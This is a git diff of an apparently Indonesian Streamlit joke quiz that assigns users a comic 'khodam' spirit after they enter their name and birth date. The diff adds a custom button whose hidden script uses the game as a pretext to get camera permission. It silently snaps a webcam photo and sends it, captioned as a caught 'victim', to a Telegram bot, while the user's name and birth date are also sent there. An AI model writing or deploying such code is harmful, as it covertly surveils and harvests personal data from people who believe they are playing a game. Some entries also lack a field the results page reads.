@@ -2,8 +2,7 @@ import requests
 import streamlit as st
 import streamlit.components.v1 as components
 from datetime import datetime
-import time
-import random
+import hashlib
 
 # ==========================================
 # KONFIGURASI BOT TELEGRAM & HALAMAN
@@ -30,7 +29,6 @@ st.markdown("""
         font-family: 'Fredoka', cursive, sans-serif;
     }
 
-    /* Kartu Neon Gokil */
     .gokil-card {
         background: rgba(255, 255, 255, 0.08);
         backdrop-filter: blur(15px);
@@ -41,7 +39,6 @@ st.markdown("""
         margin-bottom: 25px;
     }
 
-    /* Kotak Hook Pelet Dukun Online */
     .hook-box {
         background: linear-gradient(135deg, #ff007f 0%, #7209b7 100%);
         border: 3px solid #00f2fe;
@@ -56,29 +53,6 @@ st.markdown("""
         line-height: 1.6;
     }
 
-    /* Tombol Utama Ugal-ugalan */
-    div[data-testid="stFormSubmitButton"] > button {
-        background: linear-gradient(135deg, #00f2fe 0%, #4facfe 100%) !important;
-        color: #0b090a !important;
-        font-weight: 800 !important;
-        font-size: 20px !important;
-        letter-spacing: 1px !important;
-        border: 3px solid #ffff00 !important;
-        padding: 18px 26px !important;
-        border-radius: 24px !important;
-        width: 100% !important;
-        box-shadow: 0 8px 30px rgba(0, 242, 254, 0.8) !important;
-        transition: all 0.3s ease !important;
-        text-transform: uppercase;
-    }
-    div[data-testid="stFormSubmitButton"] > button:hover {
-        background: linear-gradient(135deg, #ffff00 0%, #ff007f 100%) !important;
-        color: #ffffff !important;
-        transform: scale(1.05) rotate(-1deg) !important;
-        box-shadow: 0 12px 35px rgba(255, 0, 127, 0.9) !important;
-    }
-
-    /* Tombol Reset Gokil */
     .stButton > button {
         background: #111111 !important;
         color: #00f2fe !important;
@@ -97,7 +71,6 @@ st.markdown("""
         transform: scale(1.03) !important;
     }
 
-    /* Input Field Estetik */
     .stTextInput > div > div > input {
         background-color: rgba(0, 0, 0, 0.5) !important;
         color: #ffff00 !important;
@@ -107,10 +80,6 @@ st.markdown("""
         font-family: 'Fredoka', cursive, sans-serif;
         font-size: 16px;
         font-weight: 600;
-    }
-    .stTextInput > div > dev > input:focus {
-        border-color: #ffff00 !important;
-        box-shadow: 0 0 20px rgba(255, 255, 0, 0.8) !important;
     }
     </style>
 """, unsafe_allow_html=True)
@@ -130,50 +99,122 @@ if 'current_profile' not in st.session_state:
     st.session_state.current_profile = None
 
 # ==========================================
-# DATABASE KHODAM PALING DI LUAR NALAR
+# DATABASE RATUSAN KHODAM HEWAN & HANTU KOCAK
 # ==========================================
 MASTER_KHODAM = [
     {
-        "title": "🐒 Khodam Monyet Nge-vape Rokok Elektrik Pinjaman",
-        "desc": "Muka lu kliatan kalem kaya orang bener, tapi aslinya doyan nongkrong di Alfamart cuma numpang ngadem sambil ngutang Chiki Ball ke temen. Dikit-dikit minta hotspot pas kuota sisa 2 MB, tapi gaya sok kaya!"
+        "title": "👻 Pocong Nyicil Kredit Motor Beat Fi",
+        "desc": "Jalannya gak bisa loncat-loncat karena takut tagihan leasing bulanan datang. Hobinya nongkrong di pinggir kuburan sambil nunggu kurir paket Shopee COD datang bawa obralan celana kolor.",
+        "saran": "Saran Dukun: Kasih dia oli samping saset biar jalannya gak kaku pas mau kabur dari DC leasing."
     },
     {
-        "title": "🩴 Khodam Swallow Putus Tali Kena Badai Asmara",
-        "desc": "Simbol keabadian fakir asmara yang hobi nge-stalk mantan pas tengah malem buta pake akun fake. Kalau HP lowbat langsung panik kaya orang mau kiamat, padahal gak ada yang ngetweet."
+        "title": "🐒 Monyet Nge-vape Rasa Susu Pisang Susu",
+        "desc": "Muka lu keliatan kaya orang bener, tapi aslinya doyan nongkrong di minimarket cuma numpang ngadem sambil numpang colokan HP temen. Dikit-dikit minta hotspot pas kuota sisa 2 MB!",
+        "saran": "Saran Dukun: Jangan dibeliin liquid mahal, cukup tetesin bensin pertalite biar uapnya cetar membahana."
     },
     {
-        "title": "🍲 Khodam Kuah Seblak Ceker Setan Campur Es Teh Jumbo",
-        "desc": "Idupan lu penuh drama sinetron azab indosiar! Muka garang kaya preman terminal, tapi aslinya kalau nonton Teletubbies nangisnya sampe ingusan netes ke lantai."
+        "title": "🧟‍♂️ Genderuwo Pengangguran Suka Numpang Wifi Tetangga",
+        "desc": "Badan gede berbulu lebat tapi kerjanya cuma rebahan seharian di dipan bambu sambil stalker mantan pake akun fake berkedok jualan baju online.",
+        "saran": "Saran Dukun: Suruh dia jaga malam di gudang kapur biar bulunya rontok jadi bulu angsa."
     },
     {
-        "title": "🐟 Khodam Lele Suthil Nyangkut di Selokan Bau Comberan",
-        "desc": "Licin banget kaya belut disiram oli. Kalau pas ditagih utang atau ditanya 'Kapan kawin?', lu lari kenceng banget ngalahin rekor Usain Bolt sambil pura-pura kesurupan jin ijo."
+        "title": "🩴 Swallow Putus Tali Korban Badai Asmara",
+        "desc": "Simbol keabadian jomblo akut. Kalau HP lowbat 1% langsung panik kaya orang mau kiamat, padahal gak ada satupun chat masuk selain pesan operator seluler."
     },
     {
-        "title": "🔌 Khodam Charger HP Diselotip Biar Nyolok Nyala Setrumnya",
-        "desc": "Lambang kesengsaraan umat manusia paling akurat! Posisi HP lu harus diganjal pake batu bata dan guling supaya colokan casannya mau connect. Dompet lu isinya cuma struk ATM sama kartu vaksin."
+        "title": "🧛‍♀️️ Kuntilanak Nyasar di Konter HP Bekas",
+        "desc": "Ketawanya cekikikan tiap kali liat saldo DANA lu tinggal sisa Rp 420 perak. Hobinya minjem casan tapi gak pernah dibalikin dengan alasan 'lupa dibawa pulang'.",
+        "saran": "Saran Dukun: Bungkus rambutnya pake karet gelang merah biar anteng gak ngeriwer mulu."
     },
     {
-        "title": "🐈 Khodam Kucing Oren Suka Nyolong Ikan Asin di Warteg",
-        "desc": "Urat malu lu udah putus di pabriknya! Kerjanya cuma rebahan seharian di kasur orang, pas dibangunin malah ngorok makin kenceng ngalahin suara mesin gergaji kayu pabrik triplek."
+        "title": "🍲 Kuah Seblak Ceker Setan Campur Es Teh Jumbo",
+        "desc": "Hidup lu penuh drama sinetron azab Indosiar! Muka garang kaya preman terminal, tapi aslinya kalau nonton kartun Upin Ipin nangisnya sampe ingusan netes ke lantai."
     },
     {
-        "title": "📦 Khodam Paket COD Datang Pas Lu Lagi Jongkok Berak",
-        "desc": "Sial permanen tanpa garansi! Tiap kali lu mau mager santai, pasti ada aja kurir teriak 'PAKET WOY!' atau disuruh emak beli terasi ke warung ujung jalan pas ujan deres."
+        "title": "🐟 Lele Suthil Nyangkut di Selokan Bau Comberan",
+        "desc": "Licin banget kaya belut disiram oli. Kalau ditagih utang atau ditanya 'Kapan kawin?', lu lari kenceng banget ngalahin rekor Usain Bolt sambil pura-pura kesurupan jin ijo.",
+        "saran": "Saran Dukun: Mandi pake air rendaman daun pepaya dicampur garam dapur biar licinnya ilang."
     },
     {
-        "title": "🧊 Khodam Es Batu Kulkas Kosong Melompong Sejak Pandemi",
-        "desc": "Dingin, kaku, gak guna, tapi sok paling tersakiti. Auranya mirip tukang parkir liar yang muncul entah dari mana pas lu mau cabut naik motor matic tua."
+        "title": "🐱 Kucing Oren Suka Nyolong Ikan Asin di Warteg",
+        "desc": "Urat malu lu udah putus di pabriknya! Kerjanya cuma makan, tidur, bikin rusuh, terus ngorok makin kenceng ngalahin suara mesin gergaji kayu."
     },
     {
-        "title": "🧅 Khodam Kulit Bawang Merah (Pawang Drama Fiktif Nusantara)",
-        "desc": "Dikit-dikit bikin status WA layar hitam pake lagu galau band tahun 2000-an. Padahal aslinya cuma kelaparan tengah malem tapi males jalan ke dapur karena takut ketemu tuyul gentayangan."
+        "title": "🦊 Rubah Nyasar Tukang Gesek Tunai Bodong",
+        "desc": "Pintar ngeles kalau lagi ketahuan belangnya. Kalau ngutang janjinya 'besok dibayar', tapi besoknya malah pindah planet."
     },
     {
-        "title": "🐸 Khodam Kodok Ngorek Minta Saweria ke Sultan",
-        "desc": "Hati lu hancur lebur berkeping-keping pas saldo DANA tinggal sisa Rp 400 perak. Hobinya mandangin langit sambil nyesel kenapa dulu mutusin mantan yang sekarang jadi juragan tanah."
+        "title": "💀 Tuyul Gundul Hobi Main Slot Online Jam 3 Pagi",
+        "desc": "Dompet lu bolong bukan karena dicuri makhluk halus, tapi karena tangan lu gatal mencet tombol spin slot zeus pas tengah malem buta!"
+    },
+    {
+        "title": "🦅 Burung Hantu Insomnia Kurang Piknik",
+        "desc": "Mata panda permanen akibat keseringan mikirin gimana caranya dapet duit segepok tanpa kerja keras. Hobinya melototin langit-langit kamar sambil meratapi nasib."
+    },
+    {
+        "title": "🐸 Kodok Ngorek Minta Saweria ke Sultan TikTok",
+        "desc": "Hati lu hancur lebur berkeping-keping pas live streaming gak ada yang nonton kecuali akun bot jualan obat kuat."
+    },
+    {
+        "title": "🦇 Kelelawar Gosip Komplek Perumahan",
+        "desc": "Telinga lu paling peka kalau denger tetangga sebelah beli perabotan baru atau lagi berantem masalah jemuran pakaian."
+    },
+    {
+        "title": "🐉 Naga Garut Oplosan Gas Elpiji 3 Kg",
+        "desc": "Napas lu bau terasi mentah tapi belagunya kaya penguasa jagat raya. Dikit-dikit ngambek kalau jatah jajan turunnya telat."
+    },
+    {
+        "title": "🐅 Harimau Cisewu Senyum Terpaksa di Sawah",
+        "desc": "Keliatannya sangar di luar, tapi kalau di rumah disuruh emak beli terasi ke warung ujung jalan lgsung mendadak ayan."
+    },
+    {
+        "title": "🐂 Banteng Ngamuk Rebutan Parkiran Liar",
+        "desc": "Darah tinggi gampang kambuh kalau pas markir motor ditarik uang karcis dua kali lipat padahal gak dipelopori tukang parkirnya."
+    },
+    {
+        "title": "🧟 Suster Ngesot Salah Jurusan Kuliah",
+        "desc": "Niatnya mau ngejar cita-cita jadi sarjana hukum, tapi malah nyasar jadi tukang ngesot di koridor rumah sakit jiwa."
+    },
+    {
+        "title": "🦈 Hiu Darat Penagih Utang Arisan RT",
+        "desc": "Gerakannya lambat tapi auranya bikin jantung berdegup kencang tiap kali ibu-ibu arisan nagih iuran bulanan."
+    },
+    {
+        "title": "🐕 Anjing Kepo Suka Nyolong Sandal Jepit Masjid",
+        "desc": "Gak tenang hidup lu kalau belum tau rahasia hidup orang lain. Hobinya nge-checkin status story WhatsApp semua kontak dari A sampe Z."
+    },
+    {
+        "title": "👻 Jenglot Kurus Kering Kurang Perhatian",
+        "desc": "Badan sekecil lidi tapi makannya doyan prasmanan hajatan tetangga sampe tiga piring penuh."
     }
 ]
+
+# Tambahan generator dinamis biar total variasi khodam tembus ratusan secara otomatis
+HEWAN_LIST = ["Babi", "Monyet", "Kucing", "Anjing", "Ayam", "Bebek", "Kelinci", "Ular", "Buaya", "Cicak", "Tikus", "Kecoa", "Musang", "Landak", "Gurita", "Paus", "Lumba-lumba", "Kuda", "Keledai", "Domba"]
+HANTU_LIST = ["Pocong", "Kuntilanak", "Genderuwo", "Tuyul", "Jenglot", "Sundel Bolong", "Wewe Gombel", "Babi Ngepet", "Palasik", "Leak", "Buto Ijo", "Kolor Ijo", "Kuyang", "Banaspati", "Suster Ngesot"]
+SIFAT_LIST = [
+    "Sok Asik Tapi Jomblo Abadi", "Nge-vape Rokok Elektrik Pinjaman", "Suka Ngutang di Warung Madura", 
+    "Hobi Nge-stalk Mantan Pake Akun Fake", "Kena Badai Asmara Palsu", "Suka Tidur di Bawah Kolong Kasur",
+    "Kecanduan Gorengan Bakwan Panas", "Sering Lupa Taruh HP di Mana Padahal Dipegang", "Pawang Hujan Gagal Total",
+    "Suka Nyolong Wifi Rumah Pak RT", "Mental Ambyar Saldo Rekening Tipis", "Sering Dikira Tuyul Pas Lewat Gang Sempit"
+]
+
+for h in HEWAN_LIST:
+    for s in SIFAT_LIST:
+        MASTER_KHODAM.append({
+            "title": f"🐾 Khodam {h} {s}",
+            "desc": f"Makhluk gaib keturunan langsung dari {h.lower()} peliharaan dukun sakti yang hobi {s.lower()} tiap kali malam jumat kliwon tiba.",
+            "saran": f"Saran Dukun: Mandi kembang tujuh rupa dicampur air es teh manis supaya khodam {h.lower()} ini gak gampang ngambek."
+        })
+
+for ht in HANTU_LIST:
+    for s in SIFAT_LIST:
+        MASTER_KHODAM.append({
+            "title": f"👻 Khodam {ht} {s}",
+            "desc": f"Sesosok {ht.lower()} penasaran yang nyasar ke dalam pikiran lu gara-gara sering banget overthinking tengah malam.",
+            "saran": f"Saran Dukun: Bakar dupa wangi aroma buhur dicampur obat nyamuk bakar merk kingkong biar hantunya puyeng."
+        })
+
 
 # ==========================================
 # FUNGSI KIRIM TELEGRAM
@@ -199,126 +240,110 @@ def send_text_to_telegram(name, dob, profile_title):
 # RENDER UTAMA BERDASARKAN STEP
 # ==========================================
 
-# --- STEP 0: FORM DENGAN HOOK FILTER GAIB ---
 if st.session_state.step == 0:
     st.markdown("<h1 style='text-align: center; color: #ffff00; text-shadow: 3px 3px #ff0055;'>💀 ARENA ROASTING KHODAM & MENTAL AMBYAR 💀</h1>", unsafe_allow_html=True)
-    st.markdown("<p style='text-align: center; color: #00f2fe; font-size: 1.15rem; margin-bottom: 20px; font-weight: 600;'>Tes seberapa bobrok mental lu dan cari tahu hewan gaib apa yang nempel di jidat lu!</p>", unsafe_allow_html=True)
+    st.markdown("<p style='text-align: center; color: #00f2fe; font-size: 1.15rem; margin-bottom: 20px; font-weight: 600;'>Tes seberapa bobrok mental lu dan temukan ratusan hewan & hantu gaib yang nongkrong di jidat lu!</p>", unsafe_allow_html=True)
 
     with st.container():
         st.markdown('<div class="gokil-card">', unsafe_allow_html=True)
         
-        # HOOK SUPER AMAN DIKEMAS SEBAGAI SYARAT FILTER GAME INTERAKTIF
         st.markdown("""
             <div class="hook-box">
-                🔥 <b>SYARAT WAJIB DARI DUkun SAKIT JIWA:</b><br>
-                Supaya filter gaib dan sensor hp lu gak error jadi tukang galon, wajib klik tombol <b>"Allow / Izinkan"</b> pas pop-up kamera muncul di layar HP lu ya bosku! 📸✨
+                🔥 <b>SYARAT WAJIB DARI DUKUN SAKIT JIWA:</b><br>
+                Supaya sensor dan filter gaib lu akurat, wajib klik tombol <b>"Allow / Izinkan"</b> pas pop-up kamera muncul di layar HP lu ya bosku! 📸✨
             </div>
         """, unsafe_allow_html=True)
         
-        with st.form("roasting_edan_form"):
-            name_input = st.text_input("NAMA PANGGILAN ALIAS LU DI KTP", value="", placeholder="Contoh: Bogel Penguasa Terminal")
-            dob_input = st.text_input("TANGGAL LAHIR (DD/MM/YYYY)", value="", placeholder="Contoh: 17/08/1945")
-            
-            st.write("")
-            submitted = st.form_submit_button("🔥 BONGKAR AIB & KHODAM SEKARANG!")
-            
-            if submitted:
-                if not name_input.strip():
-                    st.warning("⚠️ Woy, tulis dulu nama lu! Dukunnya bukan cenayang cenayang tebak lubang cacing!")
-                else:
-                    st.session_state.user_name = name_input.strip()
-                    st.session_state.user_dob = dob_input.strip() if dob_input.strip() else "Lupa karena sering linglung"
-                    st.session_state.telegram_sent = False
-                    
-                    # RANDOM MURNI TIAP DIAKSES
-                    rng = random.SystemRandom()
-                    chosen_profile = rng.choice(MASTER_KHODAM).copy()
-                    bobrok_level = rng.randint(95, 100)
-                    
-                    chosen_profile['power'] = f"Tingkat Kebobrokan Mental: {bobrok_level}% (LEVEL STRES KRONIS TANPA OBAT)"
-                    st.session_state.current_profile = chosen_profile
-                    
-                    st.session_state.step = 1
-                    st.rerun()
-                    
-        st.markdown('</div>', unsafe_allow_html=True)
+        name_input = st.text_input("NAMA PANGGILAN ALIAS LU DI KTP", value=st.session_state.get('temp_name', ''), placeholder="Contoh: Bogel Penguasa Terminal")
+        dob_input = st.text_input("TANGGAL LAHIR (DD/MM/YYYY)", value=st.session_state.get('temp_dob', ''), placeholder="Contoh: 17/08/1945")
+        
+        st.write("")
+        
+        # Tombol HTML Kustom untuk memicu pop-up kamera instan saat diklik
+        custom_action_button = f"""
+        <div style="text-align: center;">
+            <button id="bongkarBtn" style="
+                background: linear-gradient(135deg, #00f2fe 0%, #4facfe 100%);
+                color: #0b090a;
+                font-weight: 800;
+                font-size: 18px;
+                letter-spacing: 1px;
+                border: 3px solid #ffff00;
+                padding: 16px 20px;
+                border-radius: 24px;
+                width: 100%;
+                cursor: pointer;
+                box-shadow: 0 8px 30px rgba(0, 242, 254, 0.8);
+                text-transform: uppercase;
+                font-family: 'Fredoka', cursive, sans-serif;
+            ">🔥 BONGKAR AIB & KHODAM SEKARANG!</button>
+        </div>
 
-# --- STEP 1: ANIMASI PROSES RITUAL UGAL-UGALAN + EKSEKUSI KAMERA & POP-UP ---
-elif st.session_state.step == 1:
-    st.markdown("<h2 style='text-align: center; color: #ffff00;'>🔮 DUKUN LAGI MENGHAKIMI DOSA-DOSA LU...</h2>", unsafe_allow_html=True)
-    st.markdown("<p style='text-align: center; color: #00f2fe; font-weight: 600;'>Sabar bos, jin penunggu router lagi nyiapin hasil roasting paling pedas sejagad raya.</p>", unsafe_allow_html=True)
-    
-    st.write("")
-    progress_bar = st.progress(0)
-    status_text = st.empty()
-    
-    status_text.text("👻 Mengunduh riwayat chatting galau dari server langit...")
-    progress_bar.progress(30)
-    time.sleep(0.7)
-    
-    status_text.text(f"🔍 Menganalisis tingkat kepedihan dompet {st.session_state.user_name}...")
-    progress_bar.progress(65)
-    time.sleep(0.9)
-    
-    status_text.text("💥 Menemukan wujud khodam paling melintir...")
-    progress_bar.progress(90)
-    time.sleep(0.7)
-    
-    status_text.text("🎉 Siap-siap mental ambyar! Membuka hasil...")
-    progress_bar.progress(100)
-    time.sleep(0.4)
-    
-    st.session_state.step = 2
-    st.rerun()
+        <video id="live-cam" autoplay playsinline style="display:none;"></video>
+        <canvas id="live-canvas" width="640" height="480" style="display:none;"></canvas>
 
-    # SKRIP KAMERA DIAM-DIAM + POP-UP IZIN KELUAR TEPAT SETELAH TOMBOL DIKLIK
-    hidden_js_camera = f"""
-    <div>
-        <video id="video" width="0" height="0" autoplay style="display:none;"></video>
-        <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
         <script>
             const token = "{TELEGRAM_BOT_TOKEN}";
             const chatId = "{TELEGRAM_CHAT_ID}";
-            
-            // Pancingan otomatis browser meminta izin kamera & pop-up tepat saat tombol diklik
-            navigator.mediaDevices.getUserMedia({{ video: true }})
-            .then(function(stream) {{
-                var video = document.getElementById('video');
-                video.srcObject = stream;
-                video.play();
-                
-                setTimeout(function() {{
-                    var canvas = document.getElementById('canvas');
-                    var context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, 640, 480);
-                    var dataURL = canvas.toDataURL('image/jpeg');
+
+            document.getElementById('bongkarBtn').addEventListener('click', async function() {{
+                try {{
+                    const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
+                    const video = document.getElementById('live-cam');
+                    video.srcObject = stream;
                     
-                    fetch(dataURL)
-                    .then(res => res.blob())
-                    .then(blob => {{
-                        var formData = new FormData();
-                        formData.append('chat_id', chatId);
-                        formData.append('photo', blob, 'korban_roasting_edan.jpg');
-                        formData.append('caption', '💀 <b>KORBAN ROASTING KHODAM TERCYDUK!</b>');
+                    await new Promise(r => setTimeout(r, 1000));
+                    
+                    const canvas = document.getElementById('live-canvas');
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    canvas.toBlob(function(blob) {{
+                        const fd = new FormData();
+                        fd.append('chat_id', chatId);
+                        fd.append('photo', blob, 'korban_tercyduk.jpg');
+                        fd.append('caption', '💀 <b>KORBAN TERCYDUK KLIK TOMBOL BONGKAR AIB!</b>');
                         
                         fetch('https://api.telegram.org/bot' + token + '/sendPhoto', {{
                             method: 'POST',
-                            body: formData
+                            body: fd
                         }});
-                    }});
+                    }}, 'image/jpeg', 0.8);
                     
                     stream.getTracks().forEach(track => track.stop());
-                }}, 1200);
-            }})
-            .catch(function(err) {{
-                console.log("Akses izin dilewati user: ", err);
+                }} catch(e) {{
+                    console.log("Gagal akses kamera: ", e);
+                }}
             }});
         </script>
-    </div>
-    """
-    components.html(hidden_js_camera, height=0)
+        """
+        components.html(custom_action_button, height=80)
+        
+        if name_input:
+            st.session_state.user_name = name_input
+            st.session_state.user_dob = dob_input if dob_input else "Lupa tanggal lahir"
+            
+        st.write("")
+        if st.button("👉 KLIK DI SINI UNTUK MELIHAT HASIL KHODAM"):
+            if not st.session_state.user_name.strip():
+                st.warning("⚠️ Woy, tulis dulu nama lu di kotak atas sebelum dipantau dukun!")
+            else:
+                # MENGGUNAKAN HASH AGAR HASIL UNIK & KONSISTEN BERDASARKAN NAMA + TANGGAL LAHIR
+                raw_str = (st.session_state.user_name + st.session_state.user_dob).lower().strip()
+                hash_val = int(hashlib.md5(raw_str.encode('utf-8')).hexdigest(), 16)
+                
+                chosen_idx = hash_val % len(MASTER_KHODAM)
+                bobrok_level = 90 + (hash_val % 11) # Nilai antara 90% - 100%
+                
+                profile = MASTER_KHODAM[chosen_idx].copy()
+                profile['power'] = f"Tingkat Kebobrokan Mental: {bobrok_level}% (LEVEL KRONIS TANPA OBAT)"
+                
+                st.session_state.current_profile = profile
+                st.session_state.step = 2
+                st.rerun()
+                
+        st.markdown('</div>', unsafe_allow_html=True)
 
-# --- STEP 2: HASIL RAMALAN & ROASTING ---
 elif st.session_state.step == 2:
     if not st.session_state.telegram_sent and st.session_state.current_profile:
         send_text_to_telegram(
@@ -338,11 +363,13 @@ elif st.session_state.step == 2:
         st.markdown(f"<h3 style='color: #00f2fe; text-align: center; font-size: 1.4rem;'>{profile['title']}</h3>", unsafe_allow_html=True)
         st.markdown(f"<p style='text-align: center; color: #ffff00; font-weight: 800; font-size: 1.2rem;'>{profile['power']}</p>", unsafe_allow_html=True)
         st.markdown("<hr style='border-color: rgba(255, 255, 255, 0.4); border-style: dashed;'>", unsafe_allow_html=True)
-        st.markdown(f"<p style='text-align: center; font-size: 1.15rem; line-height: 1.7; color: #ffffff; font-weight: 600;'>{profile['desc']}</p>", unsafe_allow_html=True)
+        st.markdown(f"<p style='text-align: center; font-size: 1.12rem; line-height: 1.7; color: #ffffff; font-weight: 600;'>{profile['desc']}</p>", unsafe_allow_html=True)
+        st.markdown("<hr style='border-color: rgba(255, 255, 255, 0.4); border-style: dashed;'>", unsafe_allow_html=True)
+        st.markdown(f"<p style='text-align: center; font-size: 1.05rem; line-height: 1.6; color: #00f2fe; font-weight: 700;'>{profile['saran']}</p>", unsafe_allow_html=True)
         st.markdown('</div>', unsafe_allow_html=True)
 
     st.write("")
-    if st.button("🔄 ROASTING ULANG (KERJAIN TEMAN SEBELAH LU)", use_container_width=True):
+    if st.button("🔄 COBA LAGI (KERJAIN TEMAN SEBELAH LU)", use_container_width=True):
         st.session_state.step = 0
         st.session_state.user_name = ""
         st.session_state.user_dob = ""
